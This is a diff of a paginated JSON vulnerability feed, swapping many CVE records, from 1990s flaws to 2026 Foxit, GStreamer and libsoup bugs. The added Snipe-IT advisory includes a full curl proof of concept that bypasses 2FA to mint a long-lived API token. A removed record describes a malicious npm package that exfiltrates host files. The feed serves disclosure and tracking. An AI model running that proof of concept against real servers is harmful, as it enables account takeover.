@@ -6,878 +6,896 @@
     "page": 65,
     "pageSize": 50,
     "totalPages": 234,
-    "totalItems": 11653,
+    "totalItems": 11664,
     "hasNextPage": true,
     "hasPrevPage": true
   },
   "cves": [
     {
-      "id": "CVE-1999-0471",
-      "summary": "The remote proxy server in Winroute allows a remote attacker to reconfigure the proxy without authentication through the \"cancel\" button.",
+      "id": "CVE-2026-63493",
+      "summary": "### Impact\n\nAn attacker who knows a victim's password fully bypasses that account's 2FA and obtains a persistent token with full API access as the user (read and write across the user's permissions, including admin if the victim is an admin).\n\nThe token is an API credential, not a web/UI session (using it on web routes redirects to `/login`), but the REST API covers essentially the whole application. If the victim is an admin, the token can also call the admin `users/two_factor_reset` endpoint, which is in the same un-gated API surface, to clear the account's enrolled 2FA. The next login is then forced to re-enroll a second factor, which the password-holding attacker can complete with their own device, taking over the account's web access and locking the legitimate user out.\n\n### Summary:\n\n2FA is enforced only by the `web` middleware group, not the `api` group, and the personal-access-token endpoint is in the `api` group. A session that has passed the password check but not the 2FA can mint a persistent API token and use it for full API access. \n\n### Details:\n\n`CheckForTwoFactor` is in the `web` group but not the `api` group:\n\n    // app/Http/Kernel.php\n    'web' => [ ..., CheckForTwoFactor::class, CreateFreshApiToken::class, ... ],\n    'api' => [ 'auth:api', EnforceApiUserAgent::class, ... ],   // no CheckForTwoFactor\n\nTwo consequences:\n\n1. `/two-factor` is exempt from the check, and `CreateFreshApiToken` runs right after it in the web group:\n\n    // app/Http/Middleware/CheckForTwoFactor.php\n    public const IGNORE_ROUTES = ['two-factor', 'two-factor-enroll', 'setup', 'logout'];\n\nSo a password-authenticated session that lands on `/two-factor` (before entering a code) is let through and gets issued the Passport `snipeit_passport_token` cookie.\n\n2. The token endpoint is in the `api` group, which never checks 2FA, gated only by `self.api`:\n\n    // routes/api.php -> Api\\ProfileController::createApiToken (line 98)\n    if (! Gate::allows('self.api')) { ... }   // the only gate; no 2FA check\n\nLogin authenticates on the password alone (`LoginController::login` calls `Auth::login`). 2FA is enforced only by `web` middleware on later page loads. So between a correct password and a completed second factor the session is already authenticated, can grab the Passport cookie via `/two-factor`, and can call the token endpoint over the `api` group. The token is long-lived (40-year expiry by default) and grants full API access as the user.\n\n### Proof of concept:\n\nSetup: an account with 2FA enabled and the `self.api` permission (the permission that governs API access, so any account meant to use the API has it). The attacker has the password but not the TOTP device, and never completes the second factor.\n\n    HOST=https://snipeit.example.com/\n    USER=victim\n    PASS='victim-password'\n\n    # 1. log in with the password only. Every web page now redirects to\n    #    /two-factor until a code is entered. never enter one.\n    csrf=$(curl -s -c cookies.txt \"$HOST/login\" \\\n           | grep -oP 'name=\"_token\" value=\"\\K[^\"]+')\n    curl -s -b cookies.txt -c cookies.txt \"$HOST/login\" \\\n         --data-urlencode \"_token=$csrf\" \\\n         --data-urlencode \"username=$USER\" \\\n         --data-urlencode \"password=$PASS\" -o /dev/null\n\n    # 2. GET /two-factor with no code. It is exempt from the 2FA check, so\n    #    CreateFreshApiToken issues the snipeit_passport_token cookie.\n    curl -s -b cookies.txt -c cookies.txt \"$HOST/two-factor\" -o /dev/null\n    grep -q snipeit_passport_token cookies.txt && echo \"[2] Passport cookie issued, no code\"\n\n    # 3. mint a persistent token over the api group (no 2FA check). Passport's\n    #    cookie guard wants the session's own XSRF token echoed as a header,\n    #    which our session already holds.\n    xsrf=$(awk '/XSRF-TOKEN/{print $7}' cookies.txt | tail -1)\n    xsrf=$(printf '%b' \"${xsrf//%/\\\\x}\")\n    pat=$(curl -s -b cookies.txt \"$HOST/api/v1/account/personal-access-tokens\" \\\n          -X POST -H \"Accept: application/json\" -H \"X-XSRF-TOKEN: $xsrf\" \\\n          --data-urlencode \"name=poc\" | jq -r '.payload.token')\n    echo \"[3] token: $pat\"\n\n    # 4. use the Bearer token against a real endpoint. /users/me returns the\n    #    victim's own account, proving the token acts as the victim with 2FA\n    #    never completed. (If the victim is an admin, the same token reaches the\n    #    whole API, e.g. GET /api/v1/users returns the full user directory.)\n    curl -s \"$HOST/api/v1/users/me\" \\\n         -H \"Authorization: Bearer $pat\" -H \"Accept: application/json\"\n\nStep 3 returns a token with no code ever submitted, and step 4 returns the victim's own account (`{\"id\":1,\"username\":\"victim\",\"email\":...}`). Meanwhile the same session is still blocked from every web page until 2FA is completed, which shows the `api` group simply never enforces it.\n\n## Patches\n\nFixed in commit 87c362962a via PR #19294 (FD-56499). The fix adds a new API-side middleware, `EnforceApiTwoFactorEnrollment`, registered on the `api` middleware group after `auth:api`. The new middleware answers the question \"does this token's owner have a second factor enrolled at all?\", which is orthogonal to the session-scoped `2fa_authed` flag that `CheckForTwoFactor` relies on. Behavior:\n\n- Passes through when there's no authenticated user (leaves the standard `auth:api` 401 in place).\n- Passes through when `two_factor_enabled` is disabled in settings.\n- Under optional mode (`two_factor_enabled = '1'`), only enforces on users who explicitly set `two_factor_optin = '1'`, matching the web-side behavior and preserving legacy PATs for users who never opted in.\n- Under required mode (`two_factor_enabled = '2'`), enforces regardless of optin.\n- Blocks with 403 + `Helper::formatStandardApiResponse('error', null, trans('auth/message.two_factor.please_enroll'))` when the token owner's `two_factor_enrolled != '1'`.\n\nRegression coverage lives in `tests/Feature/Authentication/EnforceApiTwoFactorEnrollmentTest.php`.\n\n### Credit\n\nReported first by [colinthebomb1](https://github.com/colinthebomb1) and [Theebanbabu](https://github.com/Theebanbabu), followup confirmation report by SRT at submersion [SRT@submersion.ai](mailto:SRT@submersion.ai).",
+      "cvssScore": 8.6,
+      "severity": "High",
+      "published": "2026-09-24",
+      "modified": "2026-09-24",
+      "cwe": {
+        "cwe_id": "CWE-288",
+        "name": "Authentication Bypass Using an Alternate Path or Channel"
+      },
+      "references": [
+        "https://github.com/grokability/snipe-it/security/advisories/GHSA-hxcx-9h4f-42xx",
+        "https://github.com/grokability/snipe-it/pull/19294",
+        "https://github.com/grokability/snipe-it/commit/87c362962a670f427be071850b218e43eff5d08e",
+        "https://github.com/grokability/snipe-it/commit/c4ea7db51ca80bf11b1d04fbe46e4a64f54dc780",
+        "https://github.com/grokability/snipe-it/releases/tag/v8.7.0"
+      ],
+      "vulnerableProducts": [
+        "snipe/snipe-it composer"
+      ],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0670",
+      "summary": "The cvsweb CGI script in CVSWeb 1.80 allows remote attackers with write access to a CVS repository to execute arbitrary commands via shell metacharacters.",
+      "cvssScore": 7.2,
+      "severity": "High",
+      "published": "2000-07-12",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "ftp://ftp.FreeBSD.org/pub/FreeBSD/CERT/advisories/FreeBSD-SA-00:37.cvsweb.asc",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0178.html",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0196.html",
+        "http://www.securityfocus.com/bid/1469",
+        "http://www.turbolinux.com/pipermail/tl-security-announce/2000-August/000015.html"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0674",
+      "summary": "ftp.pl CGI program for Virtual Visions FTP browser allows remote attackers to read directories outside of the document root via a .. (dot dot) attack.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "1999-04-09",
+      "published": "2000-07-12",
       "modified": null,
       "cwe": null,
       "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0471",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0471"
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0177.html",
+        "http://www.securityfocus.com/bid/1471",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5187",
+        "http://archives.neohapsis.com/archives/bugtraq/2000-07/0177.html",
+        "http://www.securityfocus.com/bid/1471"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-0593",
-      "summary": "The default setting for the Winlogon key entry ShutdownWithoutLogon in Windows NT allows users with physical access to shut down a Windows NT system without logging in.",
-      "cvssScore": 4.9,
-      "severity": "Medium",
-      "published": "1999-01-01",
+      "id": "CVE-2000-0649",
+      "summary": "IIS 4.0 allows remote attackers to obtain the internal IP address of the server via an HTTP 1.0 request for a web page which is protected by basic authentication and has no realm defined.",
+      "cvssScore": 2.6,
+      "severity": "Low",
+      "published": "2000-07-13",
       "modified": null,
-      "cwe": null,
+      "cwe": "CWE-200",
       "references": [
-        "http://osvdb.org/59333",
-        "http://technet.microsoft.com/en-us/library/cc722469.aspx",
-        "http://www.microsoft.com/technet/archive/winntas/deploy/confeat/06wntpcc.mspx?mfr=true",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1291",
-        "http://osvdb.org/59333"
+        "http://archives.neohapsis.com/archives/ntbugtraq/2000-q3/0025.html",
+        "http://www.securityfocus.com/bid/1499",
+        "http://archives.neohapsis.com/archives/ntbugtraq/2000-q3/0025.html",
+        "http://www.securityfocus.com/bid/1499"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-1122",
-      "summary": "Vulnerability in restore in SunOS 4.0.3 and earlier allows local users to gain privileges.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "1989-07-26",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.cert.org/advisories/CA-1989-02.html",
-        "http://www.ciac.org/ciac/bulletins/ciac-08.shtml",
-        "http://www.securityfocus.com/bid/3",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/6695",
-        "http://www.cert.org/advisories/CA-1989-02.html"
-      ],
-      "vulnerableProducts": [
-        "unknown"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1057",
-      "summary": "VMS 4.0 through 5.3 allows local users to gain privileges via the ANALYZE/PROCESS_DUMP dcl command.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "1990-10-25",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://ciac.llnl.gov/ciac/bulletins/b-04.shtml",
-        "http://www.cert.org/advisories/CA-1990-07.html",
-        "http://www.iss.net/security_center/static/7137.php",
-        "http://www.securityfocus.com/bid/12",
-        "http://ciac.llnl.gov/ciac/bulletins/b-04.shtml"
-      ],
-      "vulnerableProducts": [
-        "unknown"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1415",
-      "summary": "Vulnerability in /usr/bin/mail in DEC ULTRIX before 4.2 allows local users to gain privileges.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "1991-08-23",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.cert.org/advisories/CA-91.13.Ultrix.mail.vulnerability",
-        "http://www.securityfocus.com/bid/27",
-        "http://www.cert.org/advisories/CA-91.13.Ultrix.mail.vulnerability",
-        "http://www.securityfocus.com/bid/27"
-      ],
-      "vulnerableProducts": [
-        "unknown"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0167",
-      "summary": "In SunOS, NFS file handles could be guessed, giving unauthorized access to the exported file system.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "1991-12-06",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0167",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0167"
-      ],
-      "vulnerableProducts": [
-        "unknown"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1215",
-      "summary": "LOGIN.EXE program in Novell Netware 4.0 and 4.01 temporarily writes user name and password information to disk, which could allow local users to gain privileges.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "1993-09-16",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://ciac.llnl.gov/ciac/bulletins/d-21.shtml",
-        "http://www.cert.org/advisories/CA-1993-12.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/545",
-        "http://ciac.llnl.gov/ciac/bulletins/d-21.shtml",
-        "http://www.cert.org/advisories/CA-1993-12.html"
-      ],
-      "vulnerableProducts": [
-        "unknown"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1242",
-      "summary": "Vulnerability in subnetconfig in HP-UX 9.01 and 9.0 allows local users to gain privileges.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "1994-02-07",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://packetstormsecurity.org/advisories/hpalert/003",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/2162",
-        "http://packetstormsecurity.org/advisories/hpalert/003",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/2162"
-      ],
-      "vulnerableProducts": [
-        "unknown"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0423",
-      "summary": "Vulnerability in hpterm on HP-UX 10.20 allows local users to gain additional privileges.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "1994-06-01",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www1.itrc.hp.com/service/cki/docDisplay.do?docId=HPSBUX9903-093",
-        "http://www1.itrc.hp.com/service/cki/docDisplay.do?docId=HPSBUX9903-093"
-      ],
-      "vulnerableProducts": [
-        "unknown"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-1239",
-      "summary": "HP-UX 9.x does not properly enable the Xauthority mechanism in certain conditions, which could allow local users to access the X display even when they have not explicitly been authorized to do so.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "1994-07-13",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/advisories/1559",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/2261",
-        "http://www.securityfocus.com/advisories/1559",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/2261"
-      ],
-      "vulnerableProducts": [
-        "unknown"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0262",
-      "summary": "Hylafax faxsurvey CGI script on Linux allows remote attackers to execute arbitrary commands via shell metacharacters in the query string.",
+      "id": "CVE-2000-0675",
+      "summary": "Buffer overflow in Infopulse Gatekeeper 3.5 and earlier allows remote attackers to execute arbitrary commands via a long string.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "1998-08-04",
+      "published": "2000-07-13",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/bid/2056",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1532",
-        "http://www.securityfocus.com/bid/2056",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/1532"
+        "http://www.securityfocus.com/bid/1477",
+        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=00af01bfece2%24a52cbd80%24367e1ec4%40kungphusion",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4948",
+        "http://www.securityfocus.com/bid/1477",
+        "http://www.securityfocus.com/templates/archive.pike?list=1&msg=00af01bfece2%24a52cbd80%24367e1ec4%40kungphusion"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-1999-1417",
-      "summary": "Format string vulnerability in AnswerBook2 (AB2) web server dwhttpd 3.1a4 allows remote attackers to cause a denial of service and possibly execute arbitrary commands via encoded % characters in an HTTP request, which is improperly logged.",
+      "id": "CVE-2000-0631",
+      "summary": "An administrative script from IIS 3.0, later included in IIS 4.0 and 5.0, allows remote attackers to cause a denial of service by accessing the script without a particular argument, aka the \"Absent Directory Browser Argument\" vulnerability.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-07-14",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=96390444022878&w=2",
+        "http://www.securityfocus.com/bid/1476",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-044",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/4951",
+        "http://marc.info/?l=bugtraq&m=96390444022878&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0591",
+      "summary": "Directory traversal vulnerability in AOL Instant Messenger (AIM) 4.8 beta and earlier allows remote attackers to create arbitrary files and execute commands via a Direct Connection with an IMG tag with a SRC attribute that specifies the target filename.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-06-18",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0203.html",
+        "http://www.iss.net/security_center/static/8870.php",
+        "http://www.securityfocus.com/bid/4526",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-04/0203.html",
+        "http://www.iss.net/security_center/static/8870.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0592",
+      "summary": "AOL Instant Messenger (AIM) allows remote attackers to steal files that are being transferred to other clients by connecting to port 4443 (Direct Connection) or port 5190 (file transfer) before the intended user.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "1998-08-23",
+      "published": "2002-06-18",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/archive/1/10383",
-        "http://www.securityfocus.com/bid/253",
-        "http://www.securityfocus.com/archive/1/10383",
-        "http://www.securityfocus.com/bid/253"
+        "http://online.securityfocus.com/archive/1/269006",
+        "http://www.securityfocus.com/bid/4574",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/8931",
+        "http://online.securityfocus.com/archive/1/269006",
+        "http://www.securityfocus.com/bid/4574"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-91791",
-      "summary": "When processing a specially crafted PDF file, Foxit PDF Editor/Reader may encounter a reentrant execution condition involving JavaScript triggered by page-visibility events. This can cause the application to access a released page-view object while calculating annotation boundaries, resulting in an invalid memory read and application crash.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-09-23",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-91791",
-        "https://www.foxit.com/support/security-bulletins.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-91790",
-      "summary": "When rendering the page image, Foxit PDF Editor/Reader fails to perform validation on image objects whose optional content attributes are malformed. As a result, the program may access an already-freed internal data structure, triggering a crash due to UAF.",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-09-23",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-91790",
-        "https://www.foxit.com/support/security-bulletins.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-18649",
-      "summary": "A flaw was found in the GStreamer gst-plugins-good package. The rtph264depay and rtph265depay RTP depayloader elements do not enforce a maximum size limit on the reassembly buffer used during fragmented RTP packet processing. A remote, unauthenticated attacker can send a continuous stream of RTP fragments without ever transmitting an end-of-fragment marker, causing the reassembly buffer to grow without bound until process memory is exhausted. This results in a denial of service through process termination.",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-08-06",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-18649",
-        "https://gitlab.freedesktop.org/gstreamer/gstreamer-security/-/merge_requests/113",
-        "https://github.com/0xSemizzz/CVE-2026-18649",
-        "https://bugzilla.redhat.com/show_bug.cgi?id=2510614",
-        "https://access.redhat.com/security/cve/CVE-2026-18649"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-73434",
-      "summary": "A flaw was found in GStreamer gst-plugins-good (avidemux). In gst_avi_demux_riff_parse_vprp(), the number of available gst_riff_vprp_video_field_desc entries is calculated by dividing the remaining buffer size by the attacker-controlled vprp->fields value, rather than by sizeof(gst_riff_vprp_video_field_desc). This can cause the parser to treat more field descriptors as available than fit in the input buffer, resulting in out-of-bounds reads. Processing a crafted AVI via playbin/decodebin can crash the application (denial of service). Fixed upstream in gst-plugins-good 1.28.6 (GStreamer-SA-2026-0072).",
-      "cvssScore": 7.1,
-      "severity": "High",
-      "published": "2026-08-12",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-73434",
-        "https://access.redhat.com/errata/RHSA-2026:55434",
-        "https://access.redhat.com/errata/RHSA-2026:55436",
-        "https://access.redhat.com/errata/RHSA-2026:56966",
-        "https://access.redhat.com/errata/RHSA-2026:65959"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-15711",
-      "summary": "A vulnerability was found in libsoup's WebSocket frame parsing implementation. The library fails to validate length rules specified in RFC 6455 §5.5, which mandates that all WebSocket control frames (e.g., PING, PONG, CLOSE) contain a payload of 125 bytes or less. A remote, unauthenticated attacker can exploit this by sending a non-compliant, oversized control frame. Because the parser handles this protocol violation improperly instead of throwing an immediate connection termination error, it triggers a internal processing crash, resulting in a remote denial of service (DoS) for applications utilizing libsoup WebSockets.",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-07-14",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-15711",
-        "https://access.redhat.com/errata/RHSA-2026:68234",
-        "https://access.redhat.com/errata/RHSA-2026:68235",
-        "https://access.redhat.com/errata/RHSA-2026:68266",
-        "https://access.redhat.com/errata/RHSA-2026:68612"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-15709",
-      "summary": "A flaw was found in libsoup's WebSocket implementation when using the permessage-deflate extension. The extension's decompression loop (inflate()) processes data in chunks without enforcing an upper boundary limit on the output buffer size. While libsoup limits the incoming compressed frame size via max_incoming_payload_size, it fails to track or limit memory allocation during decompression. A separate check for decompressed size (max_total_message_size) exists but executes only after inflation is complete, and it is entirely disabled by default for client connections. A remote, unauthenticated attacker can exploit this by sending a small, highly compressed payload (a decompression bomb), causing unbounded memory allocation that triggers an Out-of-Memory (OOM) crash and a Denial of Service (DoS).",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-07-14",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-15709",
-        "https://access.redhat.com/errata/RHSA-2026:68234",
-        "https://access.redhat.com/errata/RHSA-2026:68235",
-        "https://access.redhat.com/errata/RHSA-2026:68612",
-        "https://access.redhat.com/errata/RHSA-2026:69108"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-73433",
-      "summary": "A flaw was found in GStreamer gst-plugins-good (avidemux). When parsing FUJIFILM metadata in an AVI strd chunk, gst_avi_demux_parse_strd() decrements a remaining-length counter by fixed offsets (98 and 10 bytes) without verifying sufficient data remains. For crafted strd payloads of exactly 106 or 107 bytes, the counter underflows to a very large unsigned value, causing subsequent null-terminated string scanning to read far beyond the allocated heap buffer. Date-format normalization may also write beyond the buffer end. Confirmed impacts include heap out-of-bounds read, out-of-bounds write, heap information disclosure (adjacent data appearing in parsed metadata), and application crash/denial of service. The avidemux element is auto-plugged by playbin, decodebin, and gst-discoverer, so opening or previewing a crafted AVI is sufficient to trigger the issue. Fixed upstream in gst-plugins-good 1.28.6 (GStreamer-SA-2026-0072).",
-      "cvssScore": 6.1,
-      "severity": "Medium",
-      "published": "2026-08-12",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-73433",
-        "https://access.redhat.com/errata/RHSA-2026:55434",
-        "https://access.redhat.com/errata/RHSA-2026:55436",
-        "https://access.redhat.com/errata/RHSA-2026:56966",
-        "https://access.redhat.com/errata/RHSA-2026:65959"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-F8XR-GJFQ-XFCP",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nThe package's `exports` field maps the `./package.json` subpath to `setup.js`, so any consumer resolving `require('z-deno-truth-bwhlsz/package.json')` executes JavaScript instead of reading the manifest. `setup.js` writes a Deno/Hono handler to `/tmp/h.tsx` that reads `/readflag`, `/flagserver`, `/app/backdoor.tsx`, and `/entrypoint.sh` from the host filesystem and returns their contents in the HTTP response, matching on a `hitcon{...}` pattern. The exports subpath hijack turns routine package-metadata resolution into arbitrary code execution on the installer, and the dropped file is a shipped exfiltration handler intended to be picked up by a Deno server on the host. While the file-read targets are specific to a CTF environment, the delivery mechanism (subpath hijack + filesystem drop) executes on any host that resolves the package's `./package.json` subpath.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-09-23",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://github.com/advisories/GHSA-f8xr-gjfq-xfcp",
-        "https://www.npmjs.com/package/z-deno-truth-bwhlsz/v/2.0.0",
-        "https://www.npmjs.com/package/z-deno-truth-bwhlsz/v/1.0.0"
-      ],
-      "vulnerableProducts": [
-        "z-deno-truth-bwhlsz npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2001-0775",
-      "summary": "Buffer overflow in xloadimage 4.1 (aka xli 1.16 and 1.17) in Linux allows remote attackers to execute arbitrary code via a FACES format image containing a long (1) Firstname or (2) Lastname field.",
+      "id": "CVE-2002-0757",
+      "summary": "(1) Webmin 0.96 and (2) Usermin 0.90 with password timeouts enabled allow local and possibly remote attackers to bypass authentication and gain privileges via certain control characters in the authentication information, which can force Webmin or Usermin to accept arbitrary username/session ID combinations.",
       "cvssScore": 7.5,
       "severity": "High",
-      "published": "2001-10-18",
+      "published": "2002-08-12",
       "modified": null,
-      "cwe": "CWE-119",
+      "cwe": null,
       "references": [
-        "http://www.debian.org/security/2001/dsa-069",
-        "http://www.debian.org/security/2005/dsa-695",
-        "http://www.gentoo.org/security/en/glsa/glsa-200503-05.xml",
-        "http://www.iss.net/security_center/static/6821.php",
-        "http://www.novell.com/linux/security/advisories/2001_024_xli_txt.html"
+        "http://online.securityfocus.com/archive/1/271466",
+        "http://www.iss.net/security_center/static/9037.php",
+        "http://www.linux-mandrake.com/en/security/2002/MDKSA-2002-033.php",
+        "http://www.securityfocus.com/bid/4700",
+        "http://online.securityfocus.com/archive/1/271466"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2002-0976",
-      "summary": "Internet Explorer 4.0 and later allows remote attackers to read arbitrary files via a web page that accesses a legacy XML Datasource applet (com.ms.xml.dso.XMLDSO.class) and modifies the base URL to point to the local system, which is trusted by the applet.",
-      "cvssScore": 6.4,
-      "severity": "Medium",
+      "id": "CVE-2002-1123",
+      "summary": "Buffer overflow in the authentication function for Microsoft SQL Server 2000 and Microsoft Desktop Engine (MSDE) 2000 allows remote attackers to execute arbitrary code via a long request to TCP port 1433, aka the \"Hello\" overflow.",
+      "cvssScore": 7.5,
+      "severity": "High",
       "published": "2002-09-24",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=102960731805373&w=2",
-        "http://www.iss.net/security_center/static/9885.php",
-        "http://www.securityfocus.com/bid/5490",
-        "http://marc.info/?l=bugtraq&m=102960731805373&w=2",
-        "http://www.iss.net/security_center/static/9885.php"
+        "http://marc.info/?l=bugtraq&m=102873609025020&w=2",
+        "http://online.securityfocus.com/archive/1/286220",
+        "http://www.ciac.org/ciac/bulletins/n-003.shtml",
+        "http://www.iss.net/security_center/static/9788.php",
+        "http://www.securityfocus.com/bid/5411"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2003-0112",
-      "summary": "Buffer overflow in Windows Kernel allows local users to gain privileges by causing certain error messages to be passed to a debugger.",
+      "id": "CVE-2002-0345",
+      "summary": "Symantec Ghost 7.0 stores usernames and passwords in plaintext in the NGServer\\params registry key, which could allow an attacker to gain privileges.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-06-25",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101529792821615&w=2",
+        "http://online.securityfocus.com/archive/1/258293",
+        "http://www.iss.net/security_center/static/8305.php",
+        "http://www.securityfocus.com/bid/4181",
+        "http://marc.info/?l=bugtraq&m=101529792821615&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0346",
+      "summary": "Cross-site scripting vulnerability in Cobalt RAQ 4 allows remote attackers to execute arbitrary script as other Cobalt users via Javascript in a URL to (1) service.cgi or (2) alert.cgi.",
+      "cvssScore": 7.5,
+      "severity": "High",
+      "published": "2002-06-25",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101495944202452&w=2",
+        "http://www.iss.net/security_center/static/8321.php",
+        "http://www.securityfocus.com/bid/4211",
+        "http://marc.info/?l=bugtraq&m=101495944202452&w=2",
+        "http://www.iss.net/security_center/static/8321.php"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-0347",
+      "summary": "Directory traversal vulnerability in Cobalt RAQ 4 allows remote attackers to read password-protected files, and possibly files outside the web root, via a .. (dot dot) in an HTTP request.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2002-06-25",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=101495944202452&w=2",
